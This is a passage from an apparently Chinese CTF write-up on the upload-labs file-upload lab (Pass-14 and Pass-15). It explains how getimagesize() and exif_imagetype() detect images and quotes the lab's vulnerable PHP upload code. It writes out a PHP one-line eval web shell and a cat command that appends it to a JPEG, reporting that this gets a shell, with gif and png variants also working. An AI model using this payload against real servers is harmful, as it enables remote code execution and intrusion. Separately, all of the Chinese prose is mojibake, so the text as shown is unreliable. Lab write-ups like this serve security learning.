ä¸ªå­—èŠ‚ï¼Œå¹¶ä¸è¿™äº›å·²çŸ¥çš„æ–‡ä»¶å¤´è¿›è¡Œæ¯”å¯¹ã€‚å¦‚æœåŒ¹é…ï¼Œåˆ™è®¤ä¸ºæ–‡ä»¶æ˜¯æœ‰æ•ˆçš„å›¾åƒæ–‡ä»¶ã€‚</p><ol start="2"><li><strong>MIME ç±»å‹æ£€æµ‹</strong></li></ol><p>é™¤äº†æ–‡ä»¶å¤´ä¿¡æ¯ï¼Œ<code>getimagesize()</code> è¿˜ä¼šè¿”å›å›¾åƒæ–‡ä»¶çš„ MIME ç±»å‹ï¼ˆå¦‚ <code>image/jpeg</code>ã€<code>image/png</code> ç­‰ï¼‰ã€‚è¿™æ˜¯é€šè¿‡è§£ææ–‡ä»¶å¤´ä¿¡æ¯æ¥ç¡®å®šçš„ã€‚ä¾‹å¦‚ï¼š</p><ul><li>å¦‚æœæ–‡ä»¶å¤´æ˜¯ <code>FF D8 FF</code>ï¼Œåˆ™ MIME ç±»å‹ä¸º <code>image/jpeg</code>ã€‚</li><li>å¦‚æœæ–‡ä»¶å¤´æ˜¯ <code>89 50 4E 47 ...</code>ï¼Œåˆ™ MIME ç±»å‹ä¸º <code>image/png</code>ã€‚</li></ul><p>é€šè¿‡ MIME ç±»å‹ï¼Œ<code>getimagesize()</code> å¯ä»¥è¿›ä¸€æ­¥ç¡®è®¤æ–‡ä»¶æ˜¯å¦ä¸ºæ”¯æŒçš„å›¾åƒæ ¼å¼ã€‚</p><ol start="3"><li><strong>å›¾åƒå°ºå¯¸è§£æ</strong></li></ol><p>å¦‚æœæ–‡ä»¶å¤´ç¡®è®¤æ–‡ä»¶æ˜¯æœ‰æ•ˆçš„å›¾åƒæ–‡ä»¶ï¼Œ<code>getimagesize()</code> ä¼šè¿›ä¸€æ­¥è§£ææ–‡ä»¶å†…å®¹ï¼Œæå–å›¾åƒçš„å®½åº¦å’Œé«˜åº¦ä¿¡æ¯ã€‚ä¸åŒæ ¼å¼çš„å›¾åƒæ–‡ä»¶å­˜å‚¨å°ºå¯¸ä¿¡æ¯çš„æ–¹å¼ä¸åŒï¼š</p><ul><li><strong>JPG æ–‡ä»¶</strong>ï¼šå°ºå¯¸ä¿¡æ¯å­˜å‚¨åœ¨ç‰¹å®šçš„ JPEG æ•°æ®æ®µä¸­ï¼ˆå¦‚ <code>SOF0</code> æ®µï¼‰ã€‚</li><li><strong>PNG æ–‡ä»¶</strong>ï¼šå°ºå¯¸ä¿¡æ¯å­˜å‚¨åœ¨ <code>IHDR</code> æ•°æ®å—ä¸­ã€‚</li><li><strong>GIF æ–‡ä»¶</strong>ï¼šå°ºå¯¸ä¿¡æ¯å­˜å‚¨åœ¨æ–‡ä»¶å¤´åçš„å›ºå®šä½ç½®ã€‚</li></ul><p>é€šè¿‡è§£æè¿™äº›æ•°æ®æ®µæˆ–æ•°æ®å—ï¼Œ<code>getimagesize()</code> å¯ä»¥è·å–å›¾åƒçš„å®½åº¦å’Œé«˜åº¦ã€‚</p><ol start="4"><li><strong>è¿”å›å€¼</strong></li></ol><p><code>getimagesize()</code> è¿”å›ä¸€ä¸ªæ•°ç»„ï¼ŒåŒ…å«ä»¥ä¸‹ä¿¡æ¯ï¼š</p><ul><li><code>[0]</code>ï¼šå›¾åƒå®½åº¦ï¼ˆåƒç´ ï¼‰ã€‚</li><li><code>[1]</code>ï¼šå›¾åƒé«˜åº¦ï¼ˆåƒç´ ï¼‰ã€‚</li><li><code>[2]</code>ï¼šå›¾åƒç±»å‹ï¼ˆå¦‚ <code>IMG_JPG</code>ã€<code>IMG_PNG</code> ç­‰ï¼‰ã€‚</li><li><code>[3]</code>ï¼šæ–‡æœ¬å­—ç¬¦ä¸²ï¼ŒåŒ…å«å®½åº¦å’Œé«˜åº¦çš„ HTML <code>width</code> å’Œ <code>height</code> å±æ€§ã€‚</li><li><code>[mime]</code>ï¼šå›¾åƒçš„ MIME ç±»å‹ï¼ˆå¦‚ <code>image/jpeg</code>ï¼‰ã€‚</li></ul><p>å¦‚æœæ–‡ä»¶ä¸æ˜¯æœ‰æ•ˆçš„å›¾åƒæ–‡ä»¶ï¼Œ<code>getimagesize()</code> ä¼šè¿”å› <code>false</code>ã€‚</p><ol start="5"><li><strong>å®‰å…¨æ€§</strong></li></ol><p>ç”±äº <code>getimagesize()</code> é€šè¿‡æ–‡ä»¶å¤´ä¿¡æ¯å’Œå†…å®¹è§£ææ¥åˆ¤æ–­æ–‡ä»¶æ˜¯å¦ä¸ºæœ‰æ•ˆçš„å›¾åƒæ–‡ä»¶ï¼Œå®ƒæ¯”ç®€å•çš„æ–‡ä»¶æ‰©å±•åæ£€æŸ¥æ›´å¯é ã€‚ç„¶è€Œï¼Œå®ƒä»ç„¶å­˜åœ¨ä¸€äº›æ½œåœ¨çš„å®‰å…¨é—®é¢˜ï¼š</p><ul><li><strong>æ–‡ä»¶å¤´ä¼ªé€ </strong>ï¼šæ”»å‡»è€…å¯èƒ½åœ¨æ–‡ä»¶å¼€å¤´æ·»åŠ æ­£ç¡®çš„æ–‡ä»¶å¤´ï¼Œä½†æ–‡ä»¶å†…å®¹å®é™…ä¸Šæ˜¯æ¶æ„ä»£ç ã€‚</li><li><strong>éƒ¨åˆ†æŸåçš„æ–‡ä»¶</strong>ï¼šæŸäº›æŸåçš„å›¾åƒæ–‡ä»¶å¯èƒ½ä»ç„¶é€šè¿‡ <code>getimagesize()</code> çš„æ£€æµ‹ã€‚</li></ul><p>å› æ­¤ï¼Œåœ¨å¤„ç†æ–‡ä»¶ä¸Šä¼ æ—¶ï¼Œå»ºè®®ç»“åˆå…¶ä»–å®‰å…¨æªæ–½ï¼Œå¦‚ï¼š</p><ul><li>æ£€æŸ¥æ–‡ä»¶æ‰©å±•åã€‚</li><li>ä½¿ç”¨ <code>exif_imagetype()</code> å‡½æ•°è¿›ä¸€æ­¥éªŒè¯æ–‡ä»¶ç±»å‹ã€‚</li><li>å¯¹ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œä¸¥æ ¼çš„è·¯å¾„å’Œæ–‡ä»¶åè¿‡æ»¤ã€‚</li></ul></blockquote><ul><li>çœ‹ä¸‹ä»£ç </li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">isImage</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$types</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'.jpeg|.png|.gif'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$info</span> <span class="token operator">=</span> <span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">image_type_to_extension</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$types</span><span class="token punctuation">,</span><span class="token variable">$ext</span><span class="token punctuation">)</span><span class="token operator">&gt;=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token variable">$ext</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">isImage</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"YmdHis"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$res</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"ä¸Šä¼ å‡ºé”™ï¼"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ ¸å¿ƒä»£ç ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$info</span> <span class="token operator">=</span> getimagesize<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ext</span> <span class="token operator">=</span> image_type_to_extension<span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æ£€æµ‹é€»è¾‘ä»…ç”¨åˆ°äº†<code>$info[2]</code>ä¹Ÿå°±æ˜¯å›¾åƒç±»å‹ä¿¡æ¯ã€‚å…¶å®ä¹Ÿå¯ä»¥çœ‹åˆ°ä»£ç å¹¶æ²¡æœ‰æ£€æµ‹æ–‡ä»¶åç¼€ï¼Œè€Œæ˜¯ç›´æ¥ä½¿ç”¨äº†getimagesizeå‡½æ•°è¿”å›çš„åç¼€ä¿¡æ¯ã€‚</p><p>å¯èƒ½jpgå’Œjpegè¿˜æ˜¯æœ‰åŒºåˆ«çš„ï¼š</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2009.30.23.png" style="zoom:50%;"><p>ä½†æ˜¯ç”¨<code>jpeg</code>å¤´è¿˜æ˜¯ä¸Šä¼ å¤±è´¥äº†ã€‚</p><ul><li>mac æ–‡ä»¶ç®€ä»‹æ³¨é‡Šå¤„æ·»åŠ æœ¨é©¬ï¼ˆå¤±è´¥ï¼‰</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2009.49.31.png" style="zoom:50%;"><p>å°è¯•ä¸‹è½½ä¸€ä¸ªå®Œå¥½çš„jpegæ–‡ä»¶ã€‚</p><p>ç„¶åæ’å…¥æœ¨é©¬ï¼š</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2009.51.28.png" style="zoom:50%;"><p>ä½†æ˜¯è¿™ç§æ–¹æ³•ä¸Šä¼ çš„æœ¨é©¬æ²¡æœ‰æ•ˆæœã€‚</p><ul><li>ä½¿ç”¨cat å‘½ä»¤åˆ¶ä½œå›¾ç‰‡æœ¨é©¬</li></ul><p>å¯èƒ½ç”±äºgetiamgesizeå¯¹å›¾ç‰‡æ£€æµ‹æ¯”è¾ƒå…¨é¢ã€‚æˆ‘ä»¬å…ˆä¸‹è½½ä¸€å¼ åŸå§‹çš„jpegå›¾åƒï¼Œæ”¾ä¸‹é¢äº†ï¼ˆæ¯”å¦‚å‘½åä¸ºimg.jpegï¼‰ï¼š</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E5%8E%9F%E5%A7%8Bjpeg%E5%9B%BE%E7%89%87.jpeg" alt="åŸå§‹jpegå›¾ç‰‡" style="zoom:67%;"><p>å‡†å¤‡å¥½yjh.php</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&lt;</span>?php @eval<span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'sxk'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>?<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç„¶åä½¿ç”¨catå‘½ä»¤åˆå¹¶æ–‡ä»¶ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> yjh.php <span class="token operator">&gt;&gt;</span> img.jpeg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç„¶åå¯ä»¥ç”¨010editoræ‰“å¼€çœ‹ä¸‹ï¼š</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2010.15.16.png" style="zoom:50%;"><p>å›¾ç‰‡å°¾éƒ¨å·²ç»è¢«æ·»åŠ ä¸€å¥è¯æœ¨é©¬ã€‚</p><p>æœ¨é©¬æ–‡ä»¶å¦‚ä¸‹ï¼š</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC.jpeg" alt="å›¾ç‰‡æœ¨é©¬" style="zoom:50%;"><p>ä¸Šä¼ getshellï¼š</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2010.17.51.png" style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2010.10.27.png" style="zoom:40%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2010.18.24.png" style="zoom:50%;"><h2 id="14-3-gifå›¾ç‰‡æœ¨é©¬"><a href="#14-3-gifå›¾ç‰‡æœ¨é©¬" class="headerlink" title="14.3 gifå›¾ç‰‡æœ¨é©¬"></a>14.3 gifå›¾ç‰‡æœ¨é©¬</h2><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2009.25.22.png" style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2009.39.32.png" style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2009.35.16.png" style="zoom:50%;"><p>gifè¿˜æ˜¯å¯ä»¥ç”¨è€æ–¹æ³•ç»•è¿‡æ£€æµ‹ã€‚</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2009.42.04.png" style="zoom:50%;"><p>å¦å¤–å¯ä»¥çœ‹åˆ°ï¼Œæ–‡ä»¶æœ€ç»ˆçš„åç¼€è·Ÿæ–‡ä»¶åfilenameçš„åç¼€æ²¡æœ‰å¿…ç„¶è”ç³»ï¼Œä¸»è¦ä¾èµ–äºgetiamgesizeæå–çš„æ–‡ä»¶åã€‚</p><h2 id="14-4-pngå›¾ç‰‡æœ¨é©¬"><a href="#14-4-pngå›¾ç‰‡æœ¨é©¬" class="headerlink" title="14.4 pngå›¾ç‰‡æœ¨é©¬"></a>14.4 pngå›¾ç‰‡æœ¨é©¬</h2><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2009.38.22.png" style="zoom:50%;"><p>æˆåŠŸä¸Šä¼ ã€‚</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2009.40.17.png" style="zoom:50%;"><p>pngæœ¨é©¬ä¹Ÿé€‚ç”¨ã€‚</p><h1 id="åäº”ã€Pass-15ï¼ˆexif-imagetypeæ–‡ä»¶å¤´æ£€æµ‹-å›¾ç‰‡æœ¨é©¬ï¼‰"><a href="#åäº”ã€Pass-15ï¼ˆexif-imagetypeæ–‡ä»¶å¤´æ£€æµ‹-å›¾ç‰‡æœ¨é©¬ï¼‰" class="headerlink" title="åäº”ã€Pass-15ï¼ˆexif_imagetypeæ–‡ä»¶å¤´æ£€æµ‹-å›¾ç‰‡æœ¨é©¬ï¼‰"></a>åäº”ã€Pass-15ï¼ˆexif_imagetypeæ–‡ä»¶å¤´æ£€æµ‹-å›¾ç‰‡æœ¨é©¬ï¼‰</h1><h2 id="15-1-é¢˜é¢"><a href="#15-1-é¢˜é¢" class="headerlink" title="15.1 é¢˜é¢"></a>15.1 é¢˜é¢</h2><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2010.36.02.png" style="zoom:50%;"><p>æ›´ä¸Šä¸€å…³ä¸€æ ·ã€‚</p><h2 id="15-2-gifå›¾ç‰‡æœ¨é©¬"><a href="#15-2-gifå›¾ç‰‡æœ¨é©¬" class="headerlink" title="15.2 gifå›¾ç‰‡æœ¨é©¬"></a>15.2 gifå›¾ç‰‡æœ¨é©¬</h2><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2010.38.16.png" style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2010.39.38.png" style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2010.40.04.png" style="zoom:50%;"><p>æŒ‰ç…§è€æ–¹æ³•æ“ä½œï¼ŒæˆåŠŸgetshellã€‚</p><h2 id="15-3-pngå›¾ç‰‡æœ¨é©¬"><a href="#15-3-pngå›¾ç‰‡æœ¨é©¬" class="headerlink" title="15.3 pngå›¾ç‰‡æœ¨é©¬"></a>15.3 pngå›¾ç‰‡æœ¨é©¬</h2><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2010.41.59.png" style="zoom:50%;"><p>åŒç†ä¸Šä¼ pngæœ¨é©¬ã€‚è¿™é‡Œç‰¹æ„æ²¡æœ‰æ”¹filenameçš„åç¼€ï¼Œæœ€ç»ˆä¸Šä¼ çš„æ—¶å€™å…¶å®ä¸Šä¼ çš„æ˜¯pngåç¼€ï¼Œè¯´æ˜åç¼€åæ˜¯æ ¹æ®æ–‡ä»¶çš„ç±»å‹æå–çš„ã€‚MIMEç±»å‹æ˜¯phpä¹Ÿèƒ½ä¸Šä¼ æˆåŠŸï¼Œè¯´æ˜æ²¡æœ‰åšMIMEç±»å‹æ£€æµ‹ã€‚</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2010.45.53.png" style="zoom:40%;"><p>ç”¨è€æ–¹æ³•ä¹Ÿèƒ½æˆåŠŸgetshellã€‚</p><h2 id="15-4-jpg"><a href="#15-4-jpg" class="headerlink" title="15.4 jpg"></a>15.4 jpg</h2><p>ä½¿ç”¨ä¸Šä¸€å°èŠ‚çš„å›¾ç‰‡æœ¨é©¬ï¼š</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC-7686811.jpeg" alt="å›¾ç‰‡æœ¨é©¬" style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2010.48.16.png" style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2010.47.50.png" style="zoom:50%;"><p>åŒæ ·ä¹Ÿèƒ½getshellã€‚ä¸çŸ¥é“è¿™å…³æœ‰å•¥ç‰¹åˆ«çš„ã€‚</p><h2 id="15-5-ä»£ç å®¡è®¡"><a href="#15-5-ä»£ç å®¡è®¡" class="headerlink" title="15.5 ä»£ç å®¡è®¡"></a>15.5 ä»£ç å®¡è®¡</h2><ul><li>æç¤ºï¼š</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2010.49.00.png" style="zoom:50%;"><p>ä½¿ç”¨<code>exif_imagetype()</code>æ£€æµ‹æ–‡ä»¶ã€‚</p><ul><li>ä»£ç </li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">isImage</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment">//éœ€è¦å¼€å¯php_exifæ¨¡å—</span>    <span class="token variable">$image_type</span> <span class="token operator">=</span> <span class="token function">exif_imagetype</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$image_type</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">case</span> <span class="token constant">IMAGETYPE_GIF</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string double-quoted-string">"gif"</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token constant">IMAGETYPE_JPEG</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string double-quoted-string">"jpg"</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token constant">IMAGETYPE_PNG</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string double-quoted-string">"png"</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">default</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">isImage</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"YmdHis"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"."</span><span class="token operator">.</span><span class="token variable">$res</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"ä¸Šä¼ å‡ºé”™ï¼"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><h4 id="exif-imagetype-æ£€æµ‹æ–‡ä»¶çš„åŸç†"><a href="#exif-imagetype-æ£€æµ‹æ–‡ä»¶çš„åŸç†" class="headerlink" title="exif_imagetype()æ£€æµ‹æ–‡ä»¶çš„åŸç†"></a>exif_imagetype()æ£€æµ‹æ–‡ä»¶çš„åŸç†</h4><p><code>exif_imagetype()</code> æ˜¯ PHP ä¸­çš„ä¸€ä¸ªå†…ç½®å‡½æ•°ï¼Œç”¨äºæ£€æµ‹å›¾åƒæ–‡ä»¶çš„ç±»å‹ã€‚å®ƒçš„åŸç†æ˜¯é€šè¿‡è¯»å–å›¾åƒæ–‡ä»¶çš„<strong>ç¬¬ä¸€ä¸ªå­—èŠ‚</strong>å¹¶æ£€æŸ¥å…¶<strong>ç­¾åï¼ˆMagic Numberï¼‰</strong>æ¥ç¡®å®šæ–‡ä»¶ç±»å‹ã€‚å¦‚æœå‘ç°åŒ¹é…çš„ç­¾åï¼Œå‡½æ•°ä¼šè¿”å›ä¸€ä¸ªä¸å›¾åƒç±»å‹å¯¹åº”çš„å¸¸é‡ï¼Œå¦åˆ™è¿”å› <code>false</code>ã€‚</p><p>å·¥ä½œåŸç†</p><ol><li><strong>è¯»å–æ–‡ä»¶å¤´</strong>ï¼š<ul><li><code>exif_imagetype()</code> ä»…è¯»å–æ–‡ä»¶çš„å¼€å¤´éƒ¨åˆ†ï¼ˆé€šå¸¸æ˜¯ä¸€ä¸ªæˆ–å‡ 